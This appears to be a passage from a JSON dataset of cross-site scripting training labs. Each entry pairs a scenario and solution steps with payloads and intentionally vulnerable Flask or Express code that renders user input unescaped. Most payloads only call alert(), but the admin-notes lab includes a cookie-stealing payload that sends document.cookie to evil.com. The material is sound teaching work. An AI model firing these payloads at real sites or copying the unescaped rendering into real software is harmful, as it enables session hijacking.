      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet poll = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/poll', (req, res) => {\n  const opts = poll.map(o => `<label><input type='radio' name='vote'>${o}</label><br>`).join('');\n  res.send(`<html><body>${opts}<form action='/add-option' method='POST'><input name='opt'><button>Add Option</button></form></body></html>`);\n});\n\napp.post('/add-option', (req, res) => {\n  poll.push(req.body.opt);\n  res.redirect('/poll');\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Ticket Support System - Message Preview",
      "Lab Description": "A customer support portal displays a preview of a message before submitting a ticket. The message content is rendered in real-time on the preview panel without sanitization.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Go to the support ticket form.",
        "Enter an XSS payload in the 'message' field.",
        "Observe that the preview panel immediately reflects the payload.",
        "Use a payload that triggers JavaScript execution in the preview area."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "from flask import Flask, request\napp = Flask(__name__)\n\n@app.route('/support', methods=['GET'])\ndef support_form():\n    return '''\n    <html>\n        <body>\n            <form action='/submit' method='POST'>\n                <textarea name='message' oninput=\"document.getElementById('preview').innerHTML = this.value\"></textarea>\n                <div id='preview'></div>\n                <button type='submit'>Send</button>\n            </form>\n        </body>\n    </html>\n    '''\n\n@app.route('/submit', methods=['POST'])\ndef submit():\n    return 'Ticket submitted'\n\napp.run(port=5006)"
    },
    {
      "Lab scenario": "Reflected XSS in Search Page with Dynamic Breadcrumb",
      "Lab Description": "The search feature updates the page breadcrumb dynamically based on the search query. The search term is reflected into an innerHTML context without sanitization.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Search for any keyword using the search bar.",
        "Inspect how the breadcrumb reflects the search term.",
        "Inject a payload as part of the search term.",
        "Confirm JavaScript execution."
      ],
      "payloads": [
        "\"><img src=x onerror=alert(1)>",
        "<script>alert(document.domain)</script>",
        "<svg/onload=alert('XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "from flask import Flask, request\napp = Flask(__name__)\n\n@app.route('/search')\ndef search():\n    term = request.args.get('q', '')\n    return f'''\n    <html>\n        <body>\n            <div id='breadcrumb'>Search &gt; <span id='search-term'>{term}</span></div>\n            <p>Showing results for: {term}</p>\n        </body>\n    </html>\n    '''\n\napp.run(port=5007)"
    },
    {
      "Lab scenario": "DOM XSS via Client-side Parsed JSON Data",
      "Lab Description": "A blog site loads post content from a JSON file and injects it into the DOM using `innerHTML`. Malicious script in the JSON data can lead to DOM-based XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Modify the JSON endpoint or intercept it via Burp.",
        "Insert a malicious script inside the blog content.",
        "Observe script execution after DOM injection.",
        "Use payloads inside the blog content object."
      ],
      "payloads": [
        "<script>alert('DOM XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "from flask import Flask, jsonify, request\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return '''\n    <html>\n        <body>\n            <div id='blog'></div>\n            <script>\n                fetch('/data').then(res => res.json()).then(data => {\n                    document.getElementById('blog').innerHTML = data.content;\n                });\n            </script>\n        </body>\n    </html>\n    '''\n\n@app.route('/data')\ndef data():\n    return jsonify({\"content\": \"<h1>Welcome</h1>\"})\n\napp.run(port=5008)"
    },
    {
      "Lab scenario": "XSS in User Comments with Template Literals",
      "Lab Description": "A forum app renders user comments using JavaScript template literals without escaping content, allowing injection of script tags.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a comment with an XSS payload.",
        "Observe the comment list where content is rendered with backtick-based templates.",
        "Payload will execute as part of the rendered comment."
      ],
      "payloads": [
        "<img src=x onerror=alert('comment')>",
        "<script>alert('comment xss')</script>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "from flask import Flask, request\napp = Flask(__name__)\ncomments = []\n\n@app.route('/', methods=['GET', 'POST'])\ndef home():\n    if request.method == 'POST':\n        comments.append(request.form['comment'])\n    comment_html = ''.join([f\"<li>{c}</li>\" for c in comments])\n    return f'''\n    <html>\n        <body>\n            <form method='POST'>\n                <input name='comment'>\n                <button>Post</button>\n            </form>\n            <ul id='list'></ul>\n            <script>\n                const comments = `{comment_html}`;\n                document.getElementById('list').innerHTML = comments;\n            </script>\n        </body>\n    </html>\n    '''\n\napp.run(port=5009)"
    },
    {
      "Lab scenario": "Stored XSS in Markdown Blog Renderer",
      "Lab Description": "A blogging platform allows users to post content using Markdown. The Markdown is rendered client-side, but HTML tags inside the Markdown are not sanitized.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Create a new blog post using Markdown syntax.",
        "Include raw HTML/script inside the Markdown content.",
        "The renderer converts and displays it directly into the DOM.",
        "Use script tags to confirm code execution."
      ],
      "payloads": [
        "<script>alert('markdown')</script>",
        "<img src=x onerror=alert('markdown xss')>",
        "<svg onload=alert('xss')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "from flask import Flask, request\napp = Flask(__name__)\n\nposts = []\n\n@app.route('/', methods=['GET', 'POST'])\ndef index():\n    if request.method == 'POST':\n        posts.append(request.form['content'])\n    rendered = '<br>'.join(posts)\n    return f'''\n    <html>\n        <body>\n            <form method='POST'>\n                <textarea name='content'></textarea>\n                <button>Post</button>\n            </form>\n            <div id='posts'>{rendered}</div>\n        </body>\n    </html>\n    '''\n\napp.run(port=5010)"
    },
    {
      "Lab scenario": "Reflected XSS in Email Verification Error Message",
      "Lab Description": "An email verification system reflects the email address directly into an error message when a malformed email is entered. The input is rendered unsanitized into an HTML element.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Submit a malformed email containing a payload.",
        "Observe the reflected error message on the page.",
        "If executed, the payload triggers JavaScript."
      ],
      "payloads": [
        "<script>alert('email')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "from flask import Flask, request\napp = Flask(__name__)\n\n@app.route('/verify')\ndef verify():\n    email = request.args.get('email', '')\n    if '@' not in email:\n        return f\"\"\"\n        <html>\n            <body>\n                <p>Email verification failed: {email}</p>\n            </body>\n        </html>\n        \"\"\"\n    return 'Verified'\n\napp.run(port=5011)"
    },
    {
      "Lab scenario": "Stored XSS in Product Reviews Section",
      "Lab Description": "A shopping site allows users to leave reviews on products. Reviews are displayed on the product page without sanitizing HTML tags.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a product review containing a script payload.",
        "Visit the product page afterward.",
        "The review is rendered as HTML, executing the payload."
      ],
      "payloads": [
        "<script>alert('review')</script>",
        "<img src=x onerror=alert('stored xss')>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "from flask import Flask, request\napp = Flask(__name__)\n\nreviews = []\n\n@app.route('/', methods=['GET', 'POST'])\ndef product():\n    if request.method == 'POST':\n        reviews.append(request.form['review'])\n    review_html = '<br>'.join(reviews)\n    return f'''\n    <html>\n        <body>\n            <h2>Product A</h2>\n            <form method='POST'>\n                <textarea name='review'></textarea>\n                <button>Submit</button>\n            </form>\n            <div>{review_html}</div>\n        </body>\n    </html>\n    '''\n\napp.run(port=5012)"
    },
    {
      "Lab scenario": "DOM XSS via URL Fragment Injection",
      "Lab Description": "A single-page app reads the URL hash fragment and displays it in the interface without validation. This allows an attacker to inject JavaScript that executes in the DOM context.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Modify the URL fragment after the hash (#).",
        "Inject a script payload into the fragment.",
        "The JavaScript reads the fragment and injects it into innerHTML."
      ],
      "payloads": [
        "#<img src=x onerror=alert('dom xss')>",
        "#<script>alert('xss')</script>",
        "#<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "from flask import Flask\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return '''\n    <html>\n        <body>\n            <div id='frag'></div>\n            <script>\n                const hash = window.location.hash.substring(1);\n                document.getElementById('frag').innerHTML = hash;\n            </script>\n        </body>\n    </html>\n    '''\n\napp.run(port=5013)"
    },
    {
      "Lab scenario": "XSS in Admin-only Notes Panel (Privilege Escalation Risk)",
      "Lab Description": "Admin panel loads user notes stored in a database and renders them into a dashboard using innerHTML. Users can insert stored notes which, if viewed by admin, execute XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit a crafted note entry.",
        "Wait for an admin to view the notes page.",
        "Payload executes in the admin browser session."
      ],
      "payloads": [
        "<script>fetch('/admin/cookie',{method:'POST',body:document.cookie})</script>",
        "<img src=x onerror=document.location='http://evil.com/?'+document.cookie>",
        "<svg/onload=alert('admin')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "from flask import Flask, request\napp = Flask(__name__)\n\nnotes = []\n\n@app.route('/submit', methods=['POST'])\ndef submit():\n    notes.append(request.form['note'])\n    return 'Note submitted'\n\n@app.route('/admin')\ndef admin():\n    rendered = ''.join([f\"<div>{n}</div>\" for n in notes])\n    return f\"\"\"\n    <html>\n        <body>\n            <h2>Admin Notes Panel</h2>\n            {rendered}\n        </body>\n    </html>\n    \"\"\"\n\napp.run(port=5014)"
    },
    {
      "Lab scenario": "XSS in Image Upload Preview using FileReader",
      "Lab Description": "The application previews uploaded image filenames using FileReader and injects the name into the DOM without sanitization, allowing for payloads in fake image names.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create a fake image with a malicious filename like \"><script>alert(1)</script>.",
        "Upload it using the form.",
        "Observe XSS execution when the preview is rendered."
      ],
      "payloads": [
        "\"><svg/onload=alert(1)>",
        "\"><script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "from flask import Flask\napp = Flask(__name__)\n\n@app.route('/')\ndef upload():\n    return '''\n    <html>\n        <body>\n            <input type='file' onchange='handleFile(this.files[0])'>\n            <div id='preview'></div>\n            <script>\n                function handleFile(file) {\n                    document.getElementById('preview').innerHTML = file.name;\n                }\n            </script>\n        </body>\n    </html>\n    '''\n\napp.run(port=5015)"
    },
    {
      "Lab scenario": "XSS via Profile Avatar Upload Preview",
      "Lab Description": "The web application allows users to upload profile pictures. It provides an immediate preview by rendering the uploaded image file name into an `img` tag using client-side JavaScript. However, no sanitization is applied to the file name, leading to potential script injection.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Navigate to the profile picture upload section.",
        "Use the file picker or intercept the request and change the filename to include an XSS payload.",
        "Observe the preview functionality rendering the malicious payload in the `img` tag."
      ],
      "payloads": [
        "\"><img src=x onerror=alert(1)>",
        "\"><svg onload=alert(1)>",
        "<script>alert(1)</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/', methods=['GET', 'POST'])\ndef upload():\n    if request.method == 'POST':\n        filename = request.form.get('filename')\n        return render_template_string(f\"\"\"\n            <html>\n                <body>\n                    <h3>Upload Preview</h3>\n                    <img src='/uploads/{filename}'>\n                    <form method='POST'>\n                        <input name='filename'>\n                        <button type='submit'>Upload</button>\n                    </form>\n                </body>\n            </html>\n        \"\"\")\n    return '''<form method='POST'><input name='filename'><button type='submit'>Upload</button></form>'''\n\napp.run()"
    },
    {
      "Lab scenario": "XSS in Search Auto-Completion Suggestions",
      "Lab Description": "The application returns dynamic auto-suggestions for search input. The response is built using unsanitized input directly rendered into a dropdown list without escaping, allowing XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Go to the search bar and type an XSS payload.",
        "Observe the auto-suggestions rendering the input directly inside HTML.",
        "Trigger JavaScript execution through injected payload."
      ],
      "payloads": [
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert(1)>",
        "<script>alert('AutoXSS')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/search')\ndef search():\n    q = request.args.get('q', '')\n    return f\"<ul><li>{q}</li><li>{q} books</li></ul>\"\n\napp.run()"
    },
    {
      "Lab scenario": "Reflected XSS in Contact Us Confirmation",
      "Lab Description": "The application reflects submitted data in a confirmation page after the user fills out the contact form. The input is echoed back without encoding, leading to reflected XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Submit the contact form with a payload in the 'name' field.",
        "Observe the output rendered in the confirmation page.",
        "Check for JavaScript execution."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "\"><img src=x onerror=alert(1)>",
        "<svg/onload=alert('XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/', methods=['GET', 'POST'])\ndef contact():\n    if request.method == 'POST':\n        name = request.form.get('name')\n        return f\"<h3>Thanks for contacting us, {name}!</h3>\"\n    return '''<form method='POST'><input name='name'><button type='submit'>Submit</button></form>'''\n\napp.run()"
    },
    {
      "Lab scenario": "XSS in E-Commerce Coupon Feedback",
      "Lab Description": "An e-commerce site allows users to submit coupon feedback. The feedback is stored and displayed on a page using innerHTML without sanitization, introducing a DOM-based XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit feedback with an XSS payload via the coupon section.",
        "Visit the feedback page and observe the stored comment rendered unsafely.",
        "Observe the DOM-based execution of your payload."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "from flask import Flask, request, redirect\n\napp = Flask(__name__)\nfeedbacks = []\n\n@app.route('/submit', methods=['POST'])\ndef submit():\n    msg = request.form.get('msg')\n    feedbacks.append(msg)\n    return redirect('/feedback')\n\n@app.route('/feedback')\ndef feedback():\n    out = ''.join(f\"<div>{f}</div>\" for f in feedbacks)\n    return f\"<html><body>{out}</body></html>\"\n\n@app.route('/')\ndef form():\n    return '''<form action='/submit' method='POST'><input name='msg'><button type='submit'>Send</button></form>'''\n\napp.run()"
    },
    {
      "Lab scenario": "XSS in Newsletter Subscription Confirmation Page",
      "Lab Description": "After signing up for a newsletter, the application reflects the submitted email on a confirmation page using innerHTML. No sanitization is applied.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Enter a payload as the email value and submit the form.",
        "Observe the reflected value in the confirmation page triggering script execution."
      ],
      "payloads": [
        "\"><script>alert('XSS')</script>",
        "\"><img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "from flask import Flask, request, redirect\n\napp = Flask(__name__)\n\n@app.route('/subscribe', methods=['POST'])\ndef subscribe():\n    email = request.form.get('email')\n    return f\"<h3>Subscribed successfully with {email}</h3>\"\n\n@app.route('/')\ndef form():\n    return '''<form action='/subscribe' method='POST'><input name='email'><button type='submit'>Subscribe</button></form>'''\n\napp.run()"
    },
    {
      "Lab scenario": "XSS via Redirect Message in OAuth Flow",
      "Lab Description": "An application uses a message passed in the redirect URL during OAuth flow to display feedback. The message is inserted into the DOM without sanitization, leading to DOM-based XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Craft a redirect URL with a malicious `message` parameter.",
        "Complete the login flow and observe the message displayed unsafely.",
        "Trigger the XSS."
      ],
      "payloads": [
        "<script>alert('OAuth XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/callback')\ndef callback():\n    msg = request.args.get('message', '')\n    return f\"<div>{msg}</div>\"\n\napp.run()"
    },
    {
      "Lab scenario": "XSS in Image Gallery Caption",
      "Lab Description": "Users can submit images with custom captions. The captions are rendered under the image using innerHTML without sanitization, making it vulnerable to XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit an image with an XSS payload as a caption.",
        "View the gallery and confirm script execution."
      ],
      "payloads": [
        "<img src=x onerror=alert('XSS')>",
        "<script>alert('Gallery')</script>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "from flask import Flask, request, redirect\n\napp = Flask(__name__)\ngallery = []\n\n@app.route('/upload', methods=['POST'])\ndef upload():\n    caption = request.form.get('caption')\n    gallery.append(caption)\n    return redirect('/gallery')\n\n@app.route('/gallery')\ndef view():\n    return ''.join(f\"<div>{c}</div>\" for c in gallery)\n\n@app.route('/')\ndef form():\n    return '''<form method='POST' action='/upload'><input name='caption'><button>Submit</button></form>'''\n\napp.run()"
    },
    {
      "Lab scenario": "XSS via Admin Panel Alert Message",
      "Lab Description": "Admin panel shows alert messages based on URL parameters. This is inserted directly into the page using innerHTML.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Visit `/admin?alert=...` with an XSS payload.",
        "Confirm execution in the alert box."
      ],
      "payloads": [
        "<script>alert('Admin XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/admin')\ndef admin():\n    alert = request.args.get('alert', '')\n    return f\"<div class='alert'>{alert}</div>\"\n\napp.run()"
    },
    {
      "Lab scenario": "XSS in Tag-Based Blog Filtering",
      "Lab Description": "Blog allows filtering posts by tag using a `tag` URL parameter. The tag name is echoed on the page title and body unsanitized.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Visit the tag filter with a payload as the `tag` value.",
        "Observe the vulnerable reflection in the DOM and page title.",
        "Trigger script execution."
      ],
      "payloads": [
        "<script>alert('Tag XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/blog')\ndef blog():\n    tag = request.args.get('tag', '')\n    return f\"<html><head><title>{tag}</title></head><body>Showing posts tagged: {tag}</body></html>\"\n\napp.run()"
    },
    {
      "Lab scenario": "XSS in Live Chat Widget",
      "Lab Description": "The live chat widget reflects user input messages using innerHTML without sanitization. This leads to real-time DOM-based XSS for other users.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Send a message with XSS payload.",
        "View the live chat log from another user session.",
        "Observe XSS trigger."
      ],
      "payloads": [
        "<script>alert('Chat XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "from flask import Flask, request\n\napp = Flask(__name__)\nchat_log = []\n\n@app.route('/chat', methods=['GET', 'POST'])\ndef chat():\n    if request.method == 'POST':\n        msg = request.form.get('msg')\n        chat_log.append(msg)\n    messages = ''.join(f\"<div>{m}</div>\" for m in chat_log)\n    return f'''<form method='POST'><input name='msg'><button>Send</button></form>{messages}'''\n\napp.run()"
    },
    {
      "Lab scenario": "XSS in Newsletter Archive Viewer",
      "Lab Description": "The application archives past newsletters and displays them via an ID in the URL. The raw HTML content of the newsletter is rendered without sanitization, making it vulnerable to stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Subscribe to the newsletter and submit an XSS payload in the subscription form.",
        "Wait for the newsletter archive to reflect your submission.",
        "Access the archive viewer using the newsletter ID and observe script execution."
      ],
      "payloads": [
        "<script>alert('XSS Newsletter')</script>",
        "<img src=x onerror=alert('XSS Newsletter')>",
        "<svg/onload=alert('XSS Newsletter')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nconst newsletters = {};\nlet id = 1;\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/submit-newsletter', (req, res) => {\n  newsletters[id] = req.body.content;\n  res.redirect('/archive/' + id++);\n});\napp.get('/archive/:id', (req, res) => {\n  res.send(`<html><body>${newsletters[req.params.id]}</body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS via Order Confirmation Message",
      "Lab Description": "After placing an order, the application reflects the user's full name in the confirmation message via a GET parameter. This reflection happens directly in the HTML response without escaping.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Craft a URL with a payload in the `name` parameter.",
        "Access the URL and observe the execution of JavaScript in the confirmation message."
      ],
      "payloads": [
        "\"><script>alert('Order XSS')</script>",
        "<img src=x onerror=alert('Order XSS')>",
        "<svg/onload=alert('Order XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/confirmation', (req, res) => {\n  const name = req.query.name;\n  res.send(`<html><body><h1>Thank you, ${name}</h1></body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Dynamic FAQ Generator",
      "Lab Description": "The FAQ page allows admins to update questions and answers dynamically. These entries are stored and rendered as HTML blocks without escaping user input.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Login as admin and insert a new FAQ with a script payload.",
        "Visit the public FAQ page and observe script execution."
      ],
      "payloads": [
        "<script>alert('FAQ XSS')</script>",
        "<iframe src='javascript:alert(`FAQ XSS`)'></iframe>",
        "<img src=1 onerror=alert('FAQ XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet faqs = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/admin/faq', (req, res) => {\n  faqs.push({ q: req.body.question, a: req.body.answer });\n  res.redirect('/faq');\n});\napp.get('/faq', (req, res) => {\n  let html = '<html><body>';\n  faqs.forEach(f => {\n    html += `<div><h3>${f.q}</h3><p>${f.a}</p></div>`;\n  });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in Job Application Portal",
      "Lab Description": "Applicants can submit resumes along with a cover letter. The letter is stored and displayed to HR staff using unsafe innerHTML rendering.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a cover letter containing an XSS payload.",
        "Login as HR and review the application.",
        "Observe script execution in the resume review panel."
      ],
      "payloads": [
        "<script>alert('Job App XSS')</script>",
        "<img src=x onerror=alert('Job App XSS')>",
        "<svg/onload=alert('Job App XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet applications = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/apply', (req, res) => {\n  applications.push(req.body.letter);\n  res.redirect('/thankyou');\n});\napp.get('/hr', (req, res) => {\n  let html = '<html><body>';\n  applications.forEach(l => {\n    html += `<div>${l}</div>`;\n  });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Markdown Previewer",
      "Lab Description": "The application allows users to preview markdown content. However, certain HTML is not stripped properly, enabling attackers to inject malicious scripts.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit a post with markdown that includes a raw HTML payload.",
        "Trigger the preview functionality.",
        "Observe JavaScript execution due to unsafe rendering."
      ],
      "payloads": [
        "<script>alert('Markdown XSS')</script>",
        "<svg/onload=alert('Markdown XSS')>",
        "<img src=x onerror=alert('Markdown XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet previews = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/preview', (req, res) => {\n  previews.push(req.body.markdown);\n  res.redirect('/preview-list');\n});\napp.get('/preview-list', (req, res) => {\n  let html = '<html><body>';\n  previews.forEach(p => {\n    html += `<div>${p}</div>`;\n  });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Invoice Comments Section",
      "Lab Description": "A SaaS accounting platform allows users to add internal comments on invoices. These comments are rendered using raw HTML without sanitization when the invoice is viewed by managers.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Login as a regular user and add a malicious comment to an invoice.",
        "Ensure the invoice is viewed by a manager.",
        "Observe execution of JavaScript from the comment."
      ],
      "payloads": [
        "<script>alert('Invoice XSS')</script>",
        "<img src=x onerror=alert('Invoice XSS')>",
        "<svg/onload=alert('Invoice XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet invoices = {1: []};\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/invoice/1/comment', (req, res) => {\n  invoices[1].push(req.body.comment);\n  res.redirect('/invoice/1');\n});\napp.get('/invoice/1', (req, res) => {\n  let html = '<html><body><h2>Invoice #1</h2>';\n  invoices[1].forEach(c => { html += `<p>${c}</p>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Chat Message Formatting",
      "Lab Description": "A real-time support chat allows users to format their messages using pseudo-HTML tags. These tags are not properly parsed or sanitized before rendering, leading to script execution.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Send a message containing an XSS payload in HTML-like formatting.",
        "Wait for the support staff to view the chat window.",
        "Observe execution of the script inside the message bubble."
      ],
      "payloads": [
        "<b onmouseover=alert('Chat XSS')>Hello</b>",
        "<i><img src=1 onerror=alert('Chat XSS')></i>",
        "<u><svg/onload=alert('Chat XSS')></u>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet chats = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/chat', (req, res) => {\n  chats.push(req.body.message);\n  res.redirect('/support');\n});\napp.get('/support', (req, res) => {\n  let html = '<html><body><h2>Support Chat</h2>';\n  chats.forEach(m => { html += `<div>${m}</div>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in Project Collaboration Comments",
      "Lab Description": "Team members can leave comments on shared tasks within a collaboration platform. These comments are stored in plain text but rendered as HTML without escaping.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Post a comment containing an XSS payload.",
        "Open the project task page.",
        "Observe execution of JavaScript injected via comment."
      ],
      "payloads": [
        "<script>alert('Collab XSS')</script>",
        "<img src=x onerror=alert('Collab XSS')>",
        "<svg/onload=alert('Collab XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet comments = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/task/comment', (req, res) => {\n  comments.push(req.body.text);\n  res.redirect('/task');\n});\napp.get('/task', (req, res) => {\n  let html = '<html><body><h2>Task Discussion</h2>';\n  comments.forEach(c => { html += `<div>${c}</div>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Survey Answer Summary",
      "Lab Description": "The application displays summary results of a public survey. One of the questions allows free text input and is rendered in the admin dashboard without escaping.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a survey response with a malicious input.",
        "Login as admin and view the survey results.",
        "Observe the script execution from the user-submitted answer."
      ],
      "payloads": [
        "<script>alert('Survey XSS')</script>",
        "<img src=1 onerror=alert('Survey XSS')>",
        "<svg/onload=alert('Survey XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet answers = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/survey', (req, res) => {\n  answers.push(req.body.q);\n  res.redirect('/thankyou');\n});\napp.get('/admin/results', (req, res) => {\n  let html = '<html><body><h2>Survey Answers</h2>';\n  answers.forEach(a => { html += `<li>${a}</li>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS in Payment Status Checker",
      "Lab Description": "The application shows payment status based on user input via a GET parameter. The input is reflected into the page directly, introducing a reflected XSS vulnerability.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Navigate to the status check URL with a payload in the `txn` parameter.",
        "Observe the script execution from the reflected content."
      ],
      "payloads": [
        "<script>alert('Payment XSS')</script>",
        "<img src=x onerror=alert('Payment XSS')>",
        "<svg/onload=alert('Payment XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/payment/status', (req, res) => {\n  const txn = req.query.txn;\n  res.send(`<html><body><h1>Status for: ${txn}</h1></body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in Product Feedback Widget",
      "Lab Description": "An e-commerce site includes a feedback widget where users can share thoughts about products. These inputs are stored and displayed in the admin review page without proper sanitization.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit feedback with a script payload.",
        "Login to admin panel and check feedbacks.",
        "Observe execution of script on feedback display."
      ],
      "payloads": [
        "<script>alert('Feedback XSS')</script>",
        "<img src=x onerror=alert('Feedback XSS')>",
        "<svg/onload=alert('Feedback XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
